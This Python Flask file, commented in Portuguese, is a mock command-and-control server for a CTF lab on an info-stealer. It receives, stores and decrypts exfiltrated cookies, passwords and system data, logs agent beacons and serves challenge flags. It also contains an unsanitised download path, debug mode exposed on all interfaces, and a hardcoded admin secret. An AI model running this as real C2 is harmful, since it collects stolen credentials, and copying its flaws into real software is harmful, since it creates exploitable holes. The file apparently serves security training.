#!/usr/bin/env python3
"""
Mock C2 Server for MyStealer CTF Lab v0.3.1

Este servidor simula um Command & Control server para fins educacionais.
APENAS para uso em ambiente de laboratório isolado.

Atualizado para v0.3.1:
- Suporte a dados criptografados (AES-256-GCM)
- Suporte a campos Serde renomeados (short names)
- FLAGS do CTF embutidas
"""

import os
import json
import base64
import logging
import hashlib
from datetime import datetime
from pathlib import Path

from flask import Flask, request, jsonify
from flask_cors import CORS

# CTF FLAGS - Para os challenges
CTF_FLAGS = {
    "health_check": "CTF{c2_mock_healthy_" + datetime.now().strftime("%Y%m%d") + "}",
    "session_received": "CTF{data_exfiltrated_successfully}",
    "beacon_captured": "CTF{beacon_intercepted_ir_team}",
    "decrypt_success": "CTF{aes256gcm_decrypted_master}",
}

# Configuração
app = Flask(__name__)
CORS(app)

DATA_DIR = Path("/app/data")
LOG_DIR = Path("/app/logs")

# Configurar logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_DIR / "c2_server.log") if LOG_DIR.exists() else logging.StreamHandler(),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Mapeamento de campos Serde (short -> full)
SERDE_MAPPING = {
    # CollectedData
    "t": "timestamp",
    "s": "session_id",
    "m": "modules",
    "x": "metadata",
    # BrowserData
    "b": "browsers_found",
    "p": "profiles",
    "c": "total_cookies",
    "w": "total_passwords",
    "h": "total_history",
    # FileData
    "d": "scanned_dirs",
    "f": "found_files",
    "ts": "total_scanned",
    "tm": "total_matches",
    "ms": "scan_duration_ms",
    # SystemData
    "n": "hostname",
    "o": "os_name",
    "v": "os_version",
    "u": "username",
    "hd": "home_dir",
    "cpu": "cpu_count",
    "mem": "total_memory",
    # ClipboardData
    "ct": "content_type",
    "cn": "content",
    "l": "length",
    "tr": "truncated",
}


def expand_serde_names(data, mapping=SERDE_MAPPING):
    """Expande nomes curtos de Serde para nomes completos"""
    if isinstance(data, dict):
        expanded = {}
        for key, value in data.items():
            new_key = mapping.get(key, key)
            expanded[new_key] = expand_serde_names(value, mapping)
        return expanded
    elif isinstance(data, list):
        return [expand_serde_names(item, mapping) for item in data]
    else:
        return data


def try_decrypt_data(encrypted_data):
    """
    Tenta descriptografar dados AES-256-GCM.
    Formato esperado: version(1) || nonce(12) || ciphertext
    
    Nota: Sem a chave correta, isso falhará.
    Para CTF, a chave é derivada de machine_id + username via Argon2.
    """
    try:
        if len(encrypted_data) < 13:
            return None, "Data too short"
        
        version = encrypted_data[0]
        nonce = encrypted_data[1:13]
        ciphertext = encrypted_data[13:]
        
        # Log info para análise
        info = {
            "version": version,
            "nonce_hex": nonce.hex(),
            "ciphertext_size": len(ciphertext),
            "ciphertext_preview": ciphertext[:32].hex() if len(ciphertext) >= 32 else ciphertext.hex()
        }
        
        # Tentar descriptografar com chave de teste (lab mode)
        try:
            from Crypto.Cipher import AES
            
            # Chave de teste do lab (derivada de valores conhecidos)
            # Em produção, isso seria impossível sem a chave real
            test_keys = [
                bytes([0x42] * 32),  # Chave de teste do Challenge 03
                hashlib.sha256(b"lab_test_key").digest(),
                hashlib.sha256(b"mystealer_lab").digest(),
            ]
            
            for test_key in test_keys:
                try:
                    cipher = AES.new(test_key, AES.MODE_GCM, nonce=nonce)
                    plaintext = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
                    return plaintext, None
                except:
                    continue
                    
        except ImportError:
            info["note"] = "pycryptodome not installed - cannot attempt decryption"
        except Exception as e:
            info["decrypt_error"] = str(e)
            
        return None, info
        
    except Exception as e:
        return None, str(e)


@app.route('/health', methods=['GET'])
def health_check():
    """Endpoint de health check"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "service": "mystealer-c2-mock",
        "version": "0.3.1",
        "flag": CTF_FLAGS["health_check"]  # FLAG para Challenge 02
    })


@app.route('/collect', methods=['POST'])
def collect_data():
    """
    Endpoint para receber dados exfiltrados.
    Salva os dados em arquivos para análise.
    """
    try:
        session_id = request.headers.get('X-Session-ID', 'unknown')
        chunk_index = request.headers.get('X-Chunk-Index')
        total_chunks = request.headers.get('X-Total-Chunks')
        
        # Log da requisição
        logger.info(f"[+] Dados recebidos de sessão: {session_id}")
        logger.debug(f"Headers: {dict(request.headers)}")
        
        # Obter dados
        raw_data = request.get_data()
        
        # Criar diretório para sessão
        session_dir = DATA_DIR / session_id
        session_dir.mkdir(parents=True, exist_ok=True)
        
        # Nome do arquivo
        if chunk_index:
            filename = f"chunk_{chunk_index}_{total_chunks}.bin"
        else:
            timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
            filename = f"data_{timestamp}.bin"
        
        # Salvar dados raw
        filepath = session_dir / filename
        with open(filepath, 'wb') as f:
            f.write(raw_data)
        
        logger.info(f"[+] Dados salvos em: {filepath}")
        
        # Análise dos dados
        analysis = {
            "timestamp": datetime.utcnow().isoformat(),
            "session_id": session_id,
            "raw_size": len(raw_data),
            "chunk_index": chunk_index,
            "total_chunks": total_chunks,
        }
        
        # Tentar decodificar base64
        try:
            decoded = base64.b64decode(raw_data)
            analysis["base64_decoded"] = True
            analysis["decoded_size"] = len(decoded)
            
            # Verificar se é JSON direto
            try:
                json_data = json.loads(decoded)
                analysis["type"] = "JSON"
                analysis["json_data"] = expand_serde_names(json_data)
                analysis["flag"] = CTF_FLAGS["session_received"]
            except json.JSONDecodeError:
                # Provavelmente criptografado
                analysis["type"] = "Encrypted"
                
                # Tentar descriptografar
                plaintext, decrypt_info = try_decrypt_data(decoded)
                
                if plaintext:
                    # Unshuffle (inverse of shuffle_bytes com seed 0xDEADBEEF)
                    try:
                        unshuffled = unshuffle_bytes(plaintext, 0xDEADBEEF)
                        json_data = json.loads(unshuffled)
                        analysis["decrypted"] = True
                        analysis["json_data"] = expand_serde_names(json_data)
                        analysis["flag"] = CTF_FLAGS["decrypt_success"]
                    except:
                        analysis["decrypted_raw"] = plaintext.hex()[:200]
                else:
                    analysis["encryption_info"] = decrypt_info
                    analysis["note"] = "Encrypted data - use decryptor from Challenge 03"
                
        except Exception as e:
            analysis["base64_decoded"] = False
            analysis["raw_preview"] = raw_data[:100].hex()
            analysis["error"] = str(e)
        
        # Salvar análise
        analysis_path = session_dir / f"{filename}.analysis.json"
        with open(analysis_path, 'w') as f:
            json.dump(analysis, f, indent=2, default=str)
        
        return jsonify({
            "status": "received",
            "session_id": session_id,
            "size": len(raw_data),
            "filename": filename,
            "flag": CTF_FLAGS["session_received"]
        }), 200
        
    except Exception as e:
        logger.error(f"[-] Erro ao processar dados: {e}")
        return jsonify({"error": str(e)}), 500


def unshuffle_bytes(data: bytes, seed: int) -> bytes:
    """
    Reverte o shuffle_bytes do MyStealer.
    Implementação Python do algoritmo inverso.
    """
    import random
    
    data_list = list(data)
    n = len(data_list)
    
    # Gerar a mesma sequência de swaps
    random.seed(seed)
    swaps = []
    for i in range(n - 1, 0, -1):
        j = random.randint(0, i)
        swaps.append((i, j))
    
    # Aplicar swaps em ordem reversa
    for i, j in reversed(swaps):
        data_list[i], data_list[j] = data_list[j], data_list[i]
    
    return bytes(data_list)


@app.route('/beacon', methods=['POST'])
def beacon():
    """
    Endpoint de beacon para check-in de agentes.
    """
    try:
        data = request.get_json() or {}
        session_id = data.get('session_id', 'unknown')
        
        logger.info(f"[+] Beacon recebido de: {session_id}")
        
        # Log do beacon
        beacon_file = DATA_DIR / "beacons.log"
        with open(beacon_file, 'a') as f:
            f.write(json.dumps({
                "timestamp": datetime.utcnow().isoformat(),
                "session_id": session_id,
                "data": data,
                "remote_ip": request.remote_addr,
                "flag": CTF_FLAGS["beacon_captured"]
            }) + "\n")
        
        # Resposta (poderia conter comandos em C2 real)
        return jsonify({
            "status": "ok",
            "commands": [],  # Em C2 real, teria comandos aqui
            "sleep": 60,  # Intervalo até próximo beacon
            "flag": CTF_FLAGS["beacon_captured"]
        })
        
    except Exception as e:
        logger.error(f"[-] Erro no beacon: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/sessions', methods=['GET'])
def list_sessions():
    """
    Lista todas as sessões recebidas.
    Útil para análise do lab.
    """
    sessions = []
    
    if DATA_DIR.exists():
        for session_dir in DATA_DIR.iterdir():
            if session_dir.is_dir() and session_dir.name != '__pycache__':
                files = list(session_dir.glob("*"))
                sessions.append({
                    "session_id": session_dir.name,
                    "files": len(files),
                    "total_size": sum(f.stat().st_size for f in files if f.is_file()),
                    "last_modified": max(
                        f.stat().st_mtime for f in files if f.is_file()
                    ) if files else 0
                })
    
    return jsonify({
        "total_sessions": len(sessions),
        "sessions": sorted(sessions, key=lambda x: x.get('last_modified', 0), reverse=True)
    })


@app.route('/sessions/<session_id>', methods=['GET'])
def get_session(session_id):
    """
    Obtém detalhes de uma sessão específica.
    """
    session_dir = DATA_DIR / session_id
    
    if not session_dir.exists():
        return jsonify({"error": "Session not found"}), 404
    
    files = []
    for f in session_dir.iterdir():
        if f.is_file():
            file_info = {
                "name": f.name,
                "size": f.stat().st_size,
                "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat()
            }
            
            # Se for arquivo de análise, incluir conteúdo
            if f.name.endswith('.analysis.json'):
                try:
                    with open(f) as af:
                        file_info["analysis"] = json.load(af)
                except:
                    pass
                    
            files.append(file_info)
    
    return jsonify({
        "session_id": session_id,
        "files": files,
        "total_files": len(files)
    })


@app.route('/download/<session_id>/<filename>', methods=['GET'])
def download_file(session_id, filename):
    """
    Download de arquivo de uma sessão.
    """
    filepath = DATA_DIR / session_id / filename
    
    if not filepath.exists():
        return jsonify({"error": "File not found"}), 404
    
    with open(filepath, 'rb') as f:
        content = f.read()
    
    return content, 200, {
        'Content-Type': 'application/octet-stream',
        'Content-Disposition': f'attachment; filename={filename}'
    }


@app.route('/flags', methods=['GET'])
def get_flags():
    """
    Endpoint secreto para verificar flags do CTF.
    Apenas para validação - em CTF real, isso não existiria!
    """
    # Verificar se há um header secreto
    if request.headers.get('X-CTF-Admin') != 'mystealer_lab_2024':
        return jsonify({"error": "Unauthorized"}), 403
    
    return jsonify({
        "flags": CTF_FLAGS,
        "note": "Estas são as flags para validação do CTF"
    })


@app.route('/serde-mapping', methods=['GET'])
def get_serde_mapping():
    """
    Retorna o mapeamento de campos Serde.
    Útil para Challenge 06.
    """
    return jsonify({
        "mapping": SERDE_MAPPING,
        "note": "Mapeamento de campos curtos para nomes completos (Serde rename)"
    })


@app.route('/', methods=['GET'])
def index():
    """Página inicial"""
    return """
    <html>
    <head>
        <title>MyStealer CTF Lab - Mock C2 v0.3.1</title>
        <style>
            body { 
                font-family: 'Courier New', monospace; 
                background: #1a1a2e; 
                color: #0f0; 
                padding: 40px; 
            }
            h1 { color: #ff0; }
            h2 { color: #0ff; }
            a { color: #0ff; }
            pre { background: #000; padding: 20px; border-radius: 5px; overflow-x: auto; }
            .warning { color: #f00; }
            .success { color: #0f0; }
            .info { color: #0ff; }
            .endpoint { 
                background: #222; 
                padding: 10px; 
                margin: 10px 0; 
                border-left: 3px solid #0ff; 
            }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #333; padding: 10px; text-align: left; }
            th { background: #222; color: #ff0; }
        </style>
    </head>
    <body>
        <h1>🎯 MyStealer CTF Lab - Mock C2 Server v0.3.1</h1>
        <p class="warning">⚠️ APENAS PARA FINS EDUCACIONAIS</p>
        
        <h2>📡 Endpoints Disponíveis</h2>
        
        <div class="endpoint">
            <strong>GET /health</strong> - Health check do servidor<br>
            <code>curl http://localhost:8080/health</code>
        </div>
        
        <div class="endpoint">
            <strong>POST /collect</strong> - Receber dados exfiltrados<br>
            <code>curl -X POST -d @data.bin http://localhost:8080/collect</code>
        </div>
        
        <div class="endpoint">
            <strong>POST /beacon</strong> - Check-in de agentes<br>
            <code>curl -X POST -H "Content-Type: application/json" -d '{"session_id":"test"}' http://localhost:8080/beacon</code>
        </div>
        
        <div class="endpoint">
            <strong>GET /sessions</strong> - Listar todas as sessões<br>
            <code>curl http://localhost:8080/sessions</code>
        </div>
        
        <div class="endpoint">
            <strong>GET /sessions/{id}</strong> - Detalhes de uma sessão<br>
            <code>curl http://localhost:8080/sessions/abc123</code>
        </div>
        
        <div class="endpoint">
            <strong>GET /download/{id}/{file}</strong> - Download de arquivo<br>
            <code>curl -O http://localhost:8080/download/abc123/data.bin</code>
        </div>
        
        <div class="endpoint">
            <strong>GET /serde-mapping</strong> - Mapeamento de campos (Challenge 06)<br>
            <code>curl http://localhost:8080/serde-mapping</code>
        </div>
        
        <h2>📊 Status</h2>
        <p class="success">✅ Servidor operacional</p>
        <p><a href="/sessions">Ver sessões ativas</a></p>
        <p><a href="/health">Health check</a></p>
        
        <h2>🔐 Dados Criptografados</h2>
        <p class="info">
            MyStealer v0.3.1 usa AES-256-GCM com chave derivada via Argon2.<br>
            Para descriptografar, use o Challenge 03 ou a ferramenta em <code>defenses/</code>.
        </p>
        
        <h2>📝 Campos JSON (Serde Rename)</h2>
        <table>
            <tr><th>Campo Curto</th><th>Nome Original</th></tr>
            <tr><td>t</td><td>timestamp</td></tr>
            <tr><td>s</td><td>session_id</td></tr>
            <tr><td>m</td><td>modules</td></tr>
            <tr><td>b</td><td>browsers_found</td></tr>
            <tr><td>c</td><td>total_cookies</td></tr>
            <tr><td>p</td><td>profiles</td></tr>
            <tr><td>w</td><td>total_passwords</td></tr>
            <tr><td>h</td><td>total_history</td></tr>
        </table>
        
        <hr>
        <p>MyStealer CTF Lab v0.3.1 - Educational Purposes Only</p>
    </body>
    </html>
    """


if __name__ == '__main__':
    # Criar diretórios se necessário
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    
    logger.info("=" * 50)
    logger.info("  MyStealer Mock C2 Server v0.3.1")
    logger.info("=" * 50)
    logger.info(f"Starting server on port 8080...")
    logger.info(f"Data directory: {DATA_DIR}")
    logger.info(f"Log directory: {LOG_DIR}")
    logger.info("")
    logger.info("Endpoints:")
    logger.info("  GET  /           - Web UI")
    logger.info("  GET  /health     - Health check")
    logger.info("  POST /collect    - Receive exfiltrated data")
    logger.info("  POST /beacon     - Agent check-in")
    logger.info("  GET  /sessions   - List sessions")
    logger.info("")
    
    app.run(host='0.0.0.0', port=8080, debug=True)
